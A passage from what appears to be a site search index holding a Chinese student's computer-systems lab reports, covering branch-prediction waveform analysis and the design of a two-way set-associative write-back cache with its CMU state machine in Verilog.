<li>\u9884\u6d4b\u8df3\u8f6c\u6210\u529f</li> </ol> <p>0x330 \u8fd9\u6761\u6307\u4ee4\u9884\u6d4b\u8df3\u8f6c\u4e86\uff0c\u5e76\u4e14\u5728 ID \u9636\u6bb5\u9a8c\u8bc1\u786e\u5b9e\u5e94\u8be5\u8df3\u8f6c\uff0c\u6240\u4ee5 refetch \u4e3a 0\uff0c\u7136\u540e\u5c31\u76f4\u63a5\u65e0\u95f4\u9699\u5730\u7ee7\u7eed\u8fd0\u884c\u4e0b\u53bb\u4e86\u3002</p> <ol> <li>\u9884\u6d4b\u4e0d\u8df3\u8f6c\u5931\u8d25+\u9884\u6d4b\u8df3\u8f6c\u5931\u8d25</li> </ol> <p>\u8fd9\u91cc\u7684\u60c5\u51b5\u662f 0x344 \u6307\u4ee4\u8df3\u8f6c\u5230 0x330\uff0c\u7136\u540e 0x330 \u4e0d\u8df3\u8f6c\u63a5\u5230 0x334\u3002\u4f46\u662f\u4e24\u6b21\u7684\u5206\u652f\u9884\u6d4b\u90fd\u662f\u9519\u8bef\u7684\uff0c\u524d\u4e00\u4e2a\u9884\u6d4b\u4e86\u4e0d\u8df3\u8f6c\uff0c\u540e\u4e00\u4e2a\u9884\u6d4b\u4e86\u8df3\u8f6c\uff0c\u6240\u4ee5\u5404\u6d6a\u8d39\u4e86\u4e00\u4e2a\u5468\u671f\u3002\u5177\u4f53\u7684\u4fee\u6539\u5728\u6ce2\u5f62\u4e2d\u4e5f\u53ef\u4ee5\u6e05\u6670\u7684\u770b\u51fa\u6765\u3002\u53e6\u5916\uff0c\u8fd9\u91cc\u7b2c\u4e8c\u6b21 refetch \u534a\u4e2a\u5468\u671f\u540e\u624d\u53d8\u4e3a 1 \u662f\u56e0\u4e3a\u4e3a\u4e86\u5904\u7406 forwarding\uff0c\u7ed9\u5bc4\u5b58\u5668\u7ec4\u52a0\u4e86 double bump\uff0c\u5373\u5728\u8d1f\u8fb9\u7f18\u66f4\u65b0\u5bc4\u5b58\u5668\uff0c\u66f4\u65b0\u4e4b\u540e\u76f8\u5173\u5224\u65ad\u624d\u5f00\u59cb\u8ba4\u4e3a\u9884\u6d4b\u5931\u8d25\u4e86\u3002</p> <ol> <li>\u9884\u6d4b\u4e0d\u8df3\u8f6c\u6210\u529f</li> </ol> <p>\u8fd9\u79cd\u60c5\u51b5\u770b\u8d77\u6765\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86\uff0c0x284 \u8fd9\u6761\u6307\u4ee4\u9884\u6d4b\u4e0d\u8df3\u8f6c\uff0c\u5b9e\u9645\u4e0a\u4e5f\u4e0d\u8df3\u8f6c\uff0c\u800c\u4e14 BHT \u4e3a 00 \u4e5f\u4e0d\u9700\u8981\u4fee\u6539\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u7ee7\u7eed\u8fd0\u884c\u6ca1\u6709\u4ec0\u4e48\u5176\u4ed6\u5f71\u54cd\u4e86\u3002</p>"},{"location":"cs/system/cs3/lab1/#_9","title":"\u4e0a\u677f\u9a8c\u8bc1","text":"<p>\u4e0a\u677f\u6d4b\u8bd5\u4e00\u5207\u6b63\u5e38\uff0c\u800c\u4e14\u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u5f97\u5230\u7a0b\u5e8f\u6b63\u786e\u7684\u8f93\u51fa\uff1a</p>"},{"location":"cs/system/cs3/lab1/#_10","title":"\u601d\u8003\u9898","text":"<ol> <li>\u5206\u6790\u5206\u652f\u9884\u6d4b\u6210\u529f\u548c\u9884\u6d4b\u5931\u8d25\u65f6\u7684\u76f8\u5173\u6ce2\u5f62</li> </ol> <p>\u6ce2\u5f62\u5206\u6790\u89c1\u4e0a\uff0c\u56db\u79cd\u60c5\u51b5\u7684\u6ce2\u5f62\u5df2\u7ecf\u89e3\u91ca\u8fc7\u4e86\u3002</p> <ol> <li>\u5728\u6b63\u786e\u5b9e\u73b0 BTB \u548c BHT \u7684\u60c5\u51b5\u4e0b\uff0c\u6709\u6ca1\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0 BHT \u9884\u6d4b\u5206\u652f\u53d1\u751f\u8df3\u8f6c\uff0c\u4e5f\u5c31\u662f branch taken\uff0c\u4f46\u662f BTB \u4e2d\u67e5\u4e0d\u5230\u76ee\u6807\u8df3\u8f6c\u5730\u5740\uff0c\u4e3a\u4ec0\u4e48\uff1f</li> </ol> <p>\u6ca1\u6709\u53ef\u80fd\uff0c\u56e0\u4e3a\u521d\u59cb\u60c5\u51b5\u4e0b\u7684 BHT \u90fd\u662f 00\uff0c\u4e5f\u5c31\u662f\u4e0d\u9884\u6d4b\u8df3\u8f6c\u3002\u60f3\u8981\u8ba9 BHT \u9884\u6d4b\u8df3\u8f6c\uff0c\u4e00\u5b9a\u4f1a\u5148\u7ecf\u8fc7\u4e24\u6b21\u9884\u6d4b\u9519\u8bef\uff08\u4e5f\u5c31\u662f\u5b9e\u9645\u4e0a\u4f1a\u8df3\u8f6c\uff0cBHT \u4ece 00-&gt;01-&gt;11\uff09\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u56e0\u4e3a\u5df2\u7ecf\u53d1\u751f\u8fc7\u4e86\u4e24\u6b21\u8df3\u8f6c\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5730\u5740\u5bf9\u5e94\u7684 BTB \u5c31\u4e00\u5b9a\u5df2\u7ecf\u88ab\u66f4\u65b0\u4e3a\u4e86\u524d\u9762\u7684\u8df3\u8f6c\u5730\u5740\uff0c\u6240\u4ee5 BTB \u4e00\u5b9a\u80fd\u591f\u67e5\u5230\u76ee\u6807\u8df3\u8f6c\u5730\u5740\u3002</p> <ol> <li>\u524d\u9762\u4ecb\u7ecd\u7684 BHT \u548c BTB \u90fd\u662f\u57fa\u4e8e\u5185\u5bb9\u68c0\u7d22\uff0c\u5373\u901a\u8fc7\u5c06\u5f53\u524d PC \u548c\u8868\u4e2d\u5b58\u50a8\u7684 PC \u6bd4\u8f83\u6765\u786e\u5b9a\u5206\u652f\u4fe1\u606f\u5b58\u50a8\u4e8e\u54ea\u4e00\u8868\u9879\u3002\u8fd9\u79cd\u8bbe\u8ba1\u5f88\u50cf\u4e00\u4e2a\u5168\u76f8\u8054\u7684 cache\uff0c\u786c\u4ef6\u903b\u8f91\u5b9e\u9645\u4e0a\u4f1a\u6bd4\u8f83\u590d\u6742\uff0c\u90a3\u4e48\u80fd\u5426\u53c2\u8003\u76f4\u63a5\u6620\u5c04\u6216\u8005\u7ec4\u76f8\u8054\u7684 cache \u6765\u7b80\u5316 BHT/BTB \u7684\u5b58\u50a8\u548c\u68c0\u7d22\u903b\u8f91\uff1f\u7b80\u8ff0\u601d\u8def\u3002</li> </ol> <p>\u8fd8\u4e0d\u662f\u592a\u6e05\u695a cache \u76f8\u5173\u7684\u77e5\u8bc6\u3002\u5bf9\u4e8e\u6211\u7684\u5b9e\u73b0\u65b9\u5f0f\u4e0d\u9700\u8981\u8003\u8651\u8fd9\u4e2a\u95ee\u9898\uff0c\u56e0\u4e3a\u6211\u7684\u5b9e\u73b0\u76f8\u5f53\u4e8e\u4e00\u4e2a\u54c8\u5e0c\u8868\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 PC \u6765\u8bbf\u95ee\u5bf9\u5e94\u7684\u5206\u652f\u4fe1\u606f\u3002\u5982\u679c BTB \u548c BHT \u8bbe\u8ba1\u4e3a\u4e86\u961f\u5217/\u6808\u8fd9\u79cd\u7ed3\u6784\u9700\u8981\u9010\u4e00\u6bd4\u8f83\u7684\u8bdd\uff0c\u6211\u8ba4\u4e3a\u53ef\u80fd\u8fd8\u662f\u4e0d\u5bb9\u6613\u53c2\u8003 cache \u7684\u8bbe\u8ba1\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u961f\u5217\u7684\u5185\u5bb9\u548c\u7ed3\u6784\u662f\u4f1a\u4e0d\u65ad\u53d8\u5316\u7684\u3002</p>"},{"location":"cs/system/cs3/lab2/","title":"Cache \u8bbe\u8ba1","text":"<p> \u7ea6 3085 \u4e2a\u5b57  49 \u884c\u4ee3\u7801  7 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 lab2 \u5b9e\u9a8c\u62a5\u544a\uff082023.03.30 ~ 2023.04.13\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs3/lab2/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5728\u7ed9\u5b9a\u6846\u67b6\u6216\u8005\u81ea\u5df1\u5b9e\u73b0\u7684 CPU \u4e0a\u5b9e\u73b0 Cache\u3002</li> <li>\u7ed9\u5b9a\u6846\u67b6\u8981\u6c42\uff1a<ul> <li>\u4f7f\u7528 write-back \u548c write-allocate \u7b56\u7565</li> <li>CMU \u8981\u6c42\u4f7f\u7528 LRU \u7b56\u7565</li> <li>\u7406\u89e3\u6240\u7ed9\u4ee3\u7801\u6846\u67b6\u7684 cache \u548c CMU \u6a21\u5757</li> <li>\u8865\u5168 cache \u548c CMU \u6a21\u5757\u7684\u4ee3\u7801</li> <li>\u5728\u7ed9\u5b9a\u7684 SoC \u4e2d\uff0c\u52a0\u5165\u81ea\u5df1\u7684 CPU\uff0c\u901a\u8fc7\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u9a8c\u8bc1<ul> <li>\u5305\u62ec\u9488\u5bf9 cache \u7684\u4eff\u771f\u548c\u6574\u4f53 CPU \u7684\u4eff\u771f</li> </ul> </li> </ul> </li> <li>\u601d\u8003\u9898\uff1a<ol> <li>\u7ed9\u51fa\u672c\u5b9e\u9a8c\u7ed9\u5b9a\u8981\u6c42\u4e0b\u5730\u5740\u5206\u5272\u60c5\u51b5\u7b80\u56fe\uff0c\u8981\u6c42\u6709\u7b80\u8981\u7684\u8ba1\u7b97\u8fc7\u7a0b\u3002</li> <li>\u8bf7\u5206\u6790\u672c\u5b9e\u9a8c\u7684\u6d4b\u8bd5\u4ee3\u7801\u4e2d\u6bcf\u6761\u8bbf\u5b58\u6307\u4ee4\u7684\u547d\u4e2d/\u7f3a\u5931\u60c5\u51b5\uff0c\u5982\u679c\u53d1\u751f\u7f3a\u5931\uff0c\u8bf7\u5224\u65ad\u5176\u7f13\u5b58\u7f3a\u5931\u7684\u7c7b\u522b\u3002</li> <li>\u5728\u5b9e\u9a8c\u62a5\u544a\u5206\u522b\u5c55\u793a\u7f13\u5b58\u547d\u4e2d\u3001\u4e0d\u547d\u4e2d\u7684\u6ce2\u5f62\uff0c\u5206\u6790\u65f6\u5ef6\u5dee\u5f02\u3002</li> </ol> </li> </ul>"},{"location":"cs/system/cs3/lab2/#_2","title":"\u5173\u4e8e\u7ed9\u5b9a\u6846\u67b6","text":""},{"location":"cs/system/cs3/lab2/#_3","title":"\u8bbf\u5b58\u90e8\u5206\u7ed3\u6784","text":"<p>\u5b9e\u9a8c\u6846\u67b6\u4ece\u4e0d\u5e26\u7f13\u5b58\u53d8\u4e3a\u5e26\u7f13\u5b58\u5728 core \u4e2d\u8868\u73b0\u4e3a\u666e\u901a\u7684 RAM_B \u6362\u6210\u4e86 cmu \u4ee5\u53ca\u4e0e\u4e4b\u4ea4\u4e92\u3001\u5b9e\u9645\u5b58\u50a8\u7684 data_ram\u3002\u6b64\u65f6\u539f\u6765\u4f20\u7ed9 RAM_B \u7684\u8bfb\u53d6\u5730\u5740\u3001\u6570\u636e\u3001\u63a7\u5236\u4fe1\u53f7\u7b49\u5168\u90e8\u79fb\u4ea4\u7ed9 cmu\uff0cdata_ram \u7684\u8bfb\u5199\u64cd\u4f5c\u5219\u5168\u90e8\u7531 cmu \u6765\u63a7\u5236\u3002</p> <p>data_ram \u7684\u51e0\u4e2a\u6709\u7528\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff1a</p> <ul> <li>\u8f93\u5165\u7aef\u53e3\uff1a<ul> <li>cs\uff1a\u76f8\u5f53\u4e8e\u5bf9\u4e8e data_ram \u7684\u4f7f\u80fd\uff0ccmu \u8981\u6c42 data_ram \u8bfb\u5199\u65f6\u9700\u8981\u7f6e\u4e3a 1</li> <li>we\uff1a\u5199\u4f7f\u80fd\uff0ccs \u4e3a 1 \u65f6 we \u4e3a 1 \u8868\u793a\u5199\uff0c\u4e3a 0 \u8868\u793a\u8bfb</li> <li>addr\uff1a\u8bbf\u5b58\u5730\u5740</li> <li>din\uff1a\u5982\u679c\u662f\u5199\u64cd\u4f5c\uff0cdin \u4e3a\u5199\u5165\u7684\u6570\u636e</li> </ul> </li> <li>\u8f93\u51fa\u7aef\u53e3\uff1a<ul> <li>dout\uff1a\u5982\u679c\u662f\u8bfb\u64cd\u4f5c\uff0cdout \u4e3a\u8bfb\u51fa\u7684\u6570\u636e</li> <li>ack\uff1a\u5b8c\u6210\u4fe1\u53f7\uff0c\u4f20\u56de\u7ed9 cmu \u901a\u77e5\u5176\u5df2\u5b8c\u6210\u8bfb\u5199\u64cd\u4f5c</li> </ul> </li> </ul>"},{"location":"cs/system/cs3/lab2/#cache_1","title":"Cache \u8bbe\u8ba1\u7ed3\u6784","text":"<p>\u672c\u6b21\u5b9e\u9a8c\u8981\u6c42\u4f7f\u7528 write-back \u548c write-allocate \u7b56\u7565\uff0ccache \u6362\u51fa\u91c7\u7528 LRU \u7b56\u7565\uff0c\u6846\u67b6\u4e2d\u4f7f\u7528\u7684\u8fde\u63a5\u65b9\u5f0f\u4e3a\u4e8c\u8def\u7ec4\u76f8\u8fde\u3002</p> <p>\u5bf9\u4e8e cmu \u6a21\u5757\uff0c\u5176\u8d1f\u8d23\u94fe\u63a5 data_ram \u4ee5\u53ca cache \u6a21\u5757\uff0c\u524d\u8005\u5728\u524d\u9762\u5206\u6790\u8fc7\u4e86\uff0c\u540e\u8005\u662f\u5b9e\u9645\u5b58\u50a8\u7f13\u5b58\u6570\u636e\u7684\u5730\u65b9\u3002\u9664\u6b64\u4e4b\u5916 cmu \u6a21\u5757\u8fd8\u8981\u8fdb\u884c\u5185\u90e8\u72b6\u6001\u7684\u8f6c\u79fb\u3002\u56e0\u6b64\u63a5\u4e0b\u6765\u5206\u522b\u5206\u6790 cache \u6a21\u5757\u4ee5\u53ca cmu \u6a21\u5757\u4e2d\u7684\u72b6\u6001\u8f6c\u79fb\u90e8\u5206\u3002</p>"},{"location":"cs/system/cs3/lab2/#cache_2","title":"cache \u6a21\u5757","text":"<p>\u5148\u6765\u5206\u6790 cache \u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff1a</p> <ul> <li>\u8f93\u5165\uff1a<ul> <li>addr\u3001din\uff1a\u8bbf\u5b58\u5730\u5740\u4e0e\u5199\u5165\u6570\u636e</li> <li>load\u3001store\u3001edit\uff1a\u8bfb\u53d6\u7f13\u5b58\uff0c\u5199\u5165\u65b0\u7f13\u5b58\uff0c\u4fee\u6539\u7f13\u5b58\u6570\u636e<ul> <li>load\u3001edit \u53ea\u5728\u547d\u4e2d\u524d\u63d0\u4e0b\u6709\u7528</li> <li>\u5982\u679c\u4e09\u4e2a\u4fe1\u53f7\u5168\u4e3a 0\uff0c\u5219\u4e3a\u8bfb\u53d6\u5df2\u6709\u7f13\u5b58\u5185\u5bb9\uff0c\u4e14\u4e0d\u89c6\u4e3a\u8bbf\u95ee\uff08\u4e0d\u66f4\u65b0 recent \u4fe1\u606f\uff09</li> </ul> </li> <li>u_b_h_w\uff1a\u8bbf\u5b58\u7684\u6570\u636e\u5bbd\u5ea6\uff0c\u5373 RV32I \u4e2d\u89c4\u5b9a\u7684 laod/store \u6307\u4ee4\u7684 funct3</li> </ul> </li> <li>\u8f93\u51fa\uff1a<ul> <li>hit\uff1a\u662f\u5426\u547d\u4e2d</li> <li>dout\uff1a\u8bfb\u53d6\u7684\u7f13\u5b58\u6570\u636e</li> <li>valid\uff1a\u8bd5\u56fe\u5199\u5165\u7f13\u5b58\u7684\u4f4d\u7f6e\u662f\u5426\u5df2\u7ecf\u88ab\u4f7f\u7528</li> <li>dirty\uff1a\u8bd5\u56fe\u5199\u5165\u7f13\u5b58\u7684\u4f4d\u7f6e\u662f\u5426\u662f\u810f\u6570\u636e</li> <li>tag\uff1a\u8bd5\u56fe\u5199\u5165\u7f13\u5b58\u7684\u4f4d\u7f6e\u7684 tag \u503c</li> </ul> </li> </ul> <p>\u63a5\u4e0b\u6765\u5206\u6790 cache \u5b9e\u9645\u5b58\u50a8\u7684\u5185\u90e8\u7ed3\u6784\u3002cache \u6a21\u5757\u5185\u5f00\u4e86\u4e24\u4e2a\u6570\u7ec4 [22:0] inner_tag [0:63] \u4ee5\u53ca [31:0] inner_data [0:255]\uff0c\u524d\u8005\u8bb0\u5f55\u6bcf\u4e00\u4e2a cache line \u7684 tag\uff0c\u540e\u8005\u8bb0\u5f55\u5177\u4f53 cache line \u4e2d\u7684\u6570\u636e\u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a cache line \u4e2d\u6709 4 \u4e2a 32 \u4f4d\u7684\u6570\u636e\uff0c\u56e0\u6b64 inner_data \u6570\u7ec4\u7684\u5927\u5c0f\u4e3a 256\u3002</p> <p>\u7f13\u5b58\u7ed3\u6784\u91c7\u7528\u4e8c\u8def\u7ec4\u76f8\u8fde\uff0c\u4e00\u5171 64 \u5757\uff0c\u62c6\u4e3a 2 \u8def\uff0c\u4e5f\u5c31\u662f\u5206\u4e3a 32 \u4e2a\u7ec4\uff0c32 \u4e2a\u7ec4\u5bf9\u5e94\u7684 index \u5bbd\u5ea6\u4e3a 5\u3002\u5728\u7269\u7406\u5730\u5740\u7684\u5212\u5206\u4e0a\uff0c\u672b\u5c3e\u4e24\u4f4d\uff08[1:0]\uff09\u4e3a byte offset\uff1b\u63a5\u4e0b\u6765\u56e0\u4e3a\u4e00\u6b21\u7f13\u5b58 4 \u4e2a 32 \u4f4d\u6570\u636e\uff0c\u6240\u4ee5\u4e24\u4f4d\uff08[3:2]\uff09\u7559\u7ed9 word\uff1b\u5728\u63a5\u4e0b\u6765\u4e94\u4f4d\uff08[8:4]\uff09\u4e3a index\uff1b\u5269\u4e0b\u7684\uff08[31:9]\uff09\u4e3a tag\u3002</p> <p>\u5177\u4f53\u5185\u90e8\u5b9e\u73b0\u6839\u636e\u6846\u67b6\u5df2\u7ed9\u4ee3\u7801\u5df2\u7ecf\u6bd4\u8f83\u6e05\u6670\u4e86\uff0c\u76f4\u63a5\u8865\u5168\u5373\u53ef\uff0c\u8fd9\u4e9b\u5185\u5bb9\u653e\u5230\u4e0b\u4e00\u90e8\u5206\u6765\u8bf4\u3002</p>"},{"location":"cs/system/cs3/lab2/#cmu","title":"cmu \u6a21\u5757","text":"<p>cmu \u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u5c31\u4e0d\u7528\u7ec6\u8bf4\u4e86\uff0c\u5927\u90e8\u5206\u90fd\u662f\u4e0e data_ram \u8fdb\u884c\u4ea4\u4e92\u7684\uff0c\u4ee5\u53ca\u6d41\u6c34\u7ebf\u4f20\u6765\u7684\u8bbf\u5b58\u6307\u4ee4\u3002\u9664\u6389\u8fd9\u4e9b\u53ea\u5269\u4e0b\u4e86\u4e00\u4e2a stall \u4fe1\u53f7\uff0c\u9700\u8981\u8f93\u51fa\u5b83\u6765\u901a\u77e5\u6d41\u6c34\u7ebf\u5b8c\u5168\u6682\u505c\uff0c\u7b49\u5f85 cmu \u5b8c\u6210\u5185\u5b58\u7684\u8bfb\u5199\u64cd\u4f5c\u3002</p> <p>\u5bf9\u4e8e\u72b6\u6001\u8f6c\u79fb\uff0c\u6846\u67b6\u7684\u5b9e\u73b0\u5b9e\u9645\u4e0a\u548c\u6587\u6863\u91cc\u7684\u7565\u6709\u5dee\u522b\uff08\u65e0\u5b9e\u8d28\u6027\u5dee\u522b\uff09\uff0c\u5b9e\u9645\u7684\u72b6\u6001\u8f6c\u79fb\u56fe\u5982\u4e0b\uff1a</p> <p>\u56e0\u6b64\u540e\u7eed\u8865\u5168 cmu \u7684\u72b6\u6001\u8f6c\u79fb\u90e8\u5206\u6309\u7167\u8fd9\u4e2a\u56fe\u5c31\u53ef\u4ee5\u4e86\uff0c\u4ee5\u53ca word_count \u4ee3\u8868\u4e86\u8bb0\u5f55\u8bbf\u5b58\u4e86\u51e0\u4e2a\u6570\u636e\uff0cBACK \u548c FILL \u90fd\u9700\u8981\u7ecf\u8fc7\u56db\u6b21\u8bbf\u5b58\u624d\u4f1a\u5b8c\u6210\uff0c\u6bcf\u6b21\u5b8c\u6210\u7531 data_ram \u7684 ack \u4fe1\u53f7\u6765\u6307\u5b9a\u3002</p> <p>\u63a5\u4e0b\u6765 cmu \u63a7\u5236 cache \u6a21\u5757\u7684\u90e8\u5206\uff1a</p> <ul> <li>S_IDLE\u3001S_WAIT \u72b6\u6001\uff1a\u6309\u7167\u6b63\u5e38\u6d41\u6c34\u7ebf\u7684\u8bbf\u5b58\u6307\u4ee4\u4f20\u7ed9 cache \u6a21\u5757</li> <li>S_BACK\u3001S_PRE_BACK \u72b6\u6001\uff1a\u6b64\u65f6\u9700\u8981\u8bfb\u53d6\u7f13\u5b58\u5185\u5bb9\u51c6\u5907\u5199\u5165 RAM\uff0c\u6240\u4ee5\u6b64\u65f6\u51e0\u4e2a\u4f7f\u80fd\u4fe1\u53f7\u5168\u4e3a 0\uff0c\u53ea\u8bfb\u53d6\u51fa\u503c\uff0c\u4e14 u_b_h_w \u4e3a 010\uff08\u8bfb\u53d6 32 \u4f4d\u6570\u636e\uff09</li> <li>S_FILL \u72b6\u6001\uff1a\u6b64\u65f6\u662f\u5c06 RAM \u8bfb\u51fa\u7684\u6570\u636e\u5199\u5165\u7f13\u5b58\u4e2d\uff0c\u5f53\u8bfb\u53d6\u5b8c\u6210\u540e\u8fdb\u884c\u5199\u5165\uff0c\u6240\u4ee5 store \u4fe1\u53f7\u548c RAM \u7684 ack \u4fdd\u6301\u540c\u6b65\uff0c\u5176\u4ed6\u7c7b\u4f3c S_BACK</li> </ul> <p>\u63a5\u4e0b\u6765 cmu \u63a7\u5236 RAM \u7684\u90e8\u5206\uff1a</p> <ul> <li>S_IDLE\u3001S_PRE_BACK\u3001S_WAIT\uff1a\u4e0d\u8bbf\u95ee RAM\uff0c\u4f7f\u80fd\u5168 0</li> <li>S_BACK\uff1a\u5199\u5165 RAM\uff0ccs\u3001we \u4e3a 1\uff0c\u9700\u8981\u6b63\u786e\u8bbe\u7f6e addr\uff0cdin \u4e3a cache \u6a21\u5757\u8bfb\u51fa\u7684\u6570\u636e</li> <li>S_FILL\uff1a\u8bfb\u53d6 RAM\uff0ccs \u4e3a 1\uff0cwe \u4e3a 0\uff0c\u540c\u6837\u8bbe\u7f6e addr</li> </ul> <p>\u5269\u4e0b\u7684\u5c31\u662f stall \u4fe1\u53f7\u4e86\uff0c\u8fd9\u662f\u8981\u901a\u77e5\u6d41\u6c34\u7ebf\u5168\u90e8 stall \u7b49\u5f85\u7f13\u5b58\u8bfb\u53d6\u5b8c\u6210\u7684\u4fe1\u53f7\uff0c\u6240\u4ee5\u53ea\u8981\u4e0b\u4e00\u6b21\u7684\u72b6\u6001\u4e0d\u662f S_IDLE\uff0c\u5c31\u8981\u4e00\u76f4\u7b49\u5f85\u3002</p> <p>\u81f3\u6b64\u6846\u67b6\u91cc\u65b0\u589e\u7684\u90e8\u5206\u5c31\u5df2\u7ecf\u5b8c\u5168\u6e05\u6670\u4e86\uff0c\u63a5\u4e0b\u6765\u5b8c\u6210\u4ee3\u7801\u7684\u8865\u5168\u3002</p>"},{"location":"cs/system/cs3/lab2/#cache_3","title":"Cache \u4ee3\u7801\u8865\u5168","text":""},{"location":"cs/system/cs3/lab2/#cmu_1","title":"CMU \u63a7\u5236\u6a21\u5757","text":"<p>\u72b6\u6001\u8f6c\u79fb\u90e8\u5206\uff0c\u76f4\u63a5\u6839\u636e\u4e0a\u9762\u5206\u6790\u5f97\u5230\u7684\u56fe\u8fdb\u884c\u72b6\u6001\u8865\u5168\u5373\u53ef\uff1a</p> <pre><code>case (state)\n    S_IDLE: begin\n        if (en_r || en_w) begin\n            if (cache_hit) next_state = S_IDLE;\n            else if (cache_valid &amp;&amp; cache_dirty) next_state = S_PRE_BACK;\n            else next_state = S_FILL;\n        end\n        next_word_count = 2'b00;\n    end\n\n    S_PRE_BACK: begin\n        next_state = S_BACK;\n        next_word_count = 2'b00;\n    end\n\n    S_BACK: begin\n        if (mem_ack_i &amp;&amp; word_count == {2{1'b1}})  next_state = S_FILL;\n        else next_state = S_BACK;\n\n        if (mem_ack_i) next_word_count = word_count + 2'b01;\n        else next_word_count = word_count;\n    end\n\n    S_FILL: begin\n        if (mem_ack_i &amp;&amp; word_count == {2{1'b1}}) next_state = S_WAIT;\n        else next_state = S_FILL;\n\n        if (mem_ack_i) next_word_count = word_count + 2'b01;\n        else next_word_count = word_count;\n    end\n\n    S_WAIT: begin\n        next_state = S_IDLE;\n        next_word_count = 2'b00;\n    end\nendcase\n</code></pre> <p>\u63a7\u5236 cache \u548c RAM \u7684\u90e8\u5206\u4e0d\u9700\u8981\u4fee\u6539\u3002\u8fd8\u5269\u4e0b\u7684\u5c31\u662f\u8f93\u51fa stall \u4fe1\u53f7\uff0c\u76f4\u63a5\u5224\u65ad next_state \u548c S_IDLE \u662f\u5426\u76f8\u7b49\u5373\u53ef\uff1a</p> <pre><code>assign stall = next_state != S_IDLE;\n</code></pre>"},{"location":"cs/system/cs3/lab2/#cache_4","title":"Cache \u5b58\u50a8\u6a21\u5757","text":"<p>\u8fd9\u90e8\u5206\u662f\u4e8c\u8def\u7ec4\u76f8\u8fde\u7684\u7f13\u5b58\u5185\u90e8\u7ed3\u6784\uff0c\u5927\u90e8\u5206\u9700\u8981\u8865\u5168\u7684\u4ee3\u7801\u6709\u53e6\u4e00\u8def\u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u8003\u3002\u800c\u4e14\u9700\u8981\u8865\u5168\u7684\u90e8\u5206\u6bd4\u8f83\u7ec6\uff0c\u8fd9\u91cc\u5206\u6761\u6765\u8bf4\uff1a</p> <ul> <li>addr_tag\uff1a\u4ece\u4f20\u5165\u5730\u5740\u4e2d\u63d0\u53d6\u51fa tag \u90e8\u5206\uff0caddr[31:9] \u5373\u53ef</li> <li>addr_index\uff1a\u540c\u6837\u63d0\u53d6 index\uff0caddr[8:4]</li> <li>addr_element2\uff1a\u7b2c\u4e8c\u8def\u7684\u5757\u5730\u5740\uff0c\u56e0\u4e3a\u7b2c\u4e00\u8def\u4e3a {addr_index, 1'b0}\uff0c\u6240\u4ee5\u7b2c\u4e8c\u8def\u4e3a {addr_index, 1'b1}\uff08\u5373 index \u4e3a 0 \u65f6\u7d22\u5f15\u4e3a 0 \u548c 1\uff0cindex \u4e3a 1 \u65f6\u7d22\u5f15\u4e3a 2 \u548c 3\uff09</li> <li>addr_word2\uff1a\u7b2c\u4e8c\u8def\u7684\u5b57\u5bf9\u5e94\u5728 inner_data \u4e2d\u7684\u7d22\u5f15\uff0c\u4eff\u7167\u7b2c\u4e00\u8def\u4e3a {addr_element2, addr[3:2]}</li> <li>\u63a5\u4e0b\u6765\u662f\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\u7167\u6284\u73af\u8282<ul> <li>word2 = inner_data[addr_word2]</li> <li>half_word2 = addr[1] ? word2[31:16] : word2[15:0]</li> <li>byte2 = addr[1] ? addr[0] ? word2[31:24] : word2[23:16] : addr[0] ? word2[15:8] : word2[7:0]</li> <li>recent2 = inner_recent[addr_element2]</li> <li>valid2 = inner_valid[addr_element2]</li> <li>dirty2 = inner_dirty[addr_element2]</li> <li>tag2 = inner_tag[addr_element2]</li> <li>hit2 = valid2 &amp;&amp; (tag2 == addr_tag)</li> </ul> </li> <li>\u7136\u540e\u662f\u5173\u4e8e valid dirty tag hit \u56db\u4e2a\u4fe1\u53f7\u7684\u65f6\u5e8f\u8d4b\u503c<ul> <li>valid \u8868\u793a\u5f53\u524d\u60f3\u8981\u5199\u5165\u7684\u7f13\u5b58\u4f4d\u7f6e\u662f\u5426\u5df2\u7ecf\u5728\u4f7f\u7528\uff0c\u6b64\u65f6\u8981\u5224\u65ad\u60f3\u8981\u5199\u5165\u54ea\u4e00\u8def\uff0c\u5982\u679c recent1 \u4e3a 1\uff0c\u5219\u7b2c\u4e00\u8def\u6700\u8fd1\u4f7f\u7528\u8fc7\uff0c\u6240\u4ee5\u8981\u5199\u5165\u7b2c\u4e8c\u8def\uff0c\u4e8e\u662f\u5224\u65ad valid2 \u662f\u5426\u4e3a 1<ul> <li>\u56e0\u6b64 valid &lt;= recent1 ? valid2 : valid1</li> </ul> </li> <li>dirty \u540c\u7406\uff0crecent1 ? dirty2 : dirty1</li> <li>tag \u540c\u7406\uff0crecent1 ? tag2 : tag1</li> <li>hit \u8868\u793a\u5f53\u524d\u7684\u8bbf\u5b58\u662f\u5426 hit\uff0c\u53ea\u8981\u4e24\u8def\u4e2d\u6709\u4e00\u4e2a hit \u4e86\u90a3\u5c31\u662f hit\uff0c\u6240\u4ee5 hit &lt;= hit1 | hit2</li> </ul> </li> <li>\u63a5\u4e0b\u6765\u9488\u5bf9 load \u548c edit \u4f7f\u80fd\u4e3a 1 \u65f6\u5bf9\u4e24\u8def hit \u8fdb\u884c\u5206\u5f00\u5904\u7406\uff0c\u7167\u6284\u53e6\u4e00\u8def\u5373\u53ef\uff0c\u8fd9\u91cc\u4e0d\u8d58\u8ff0</li> 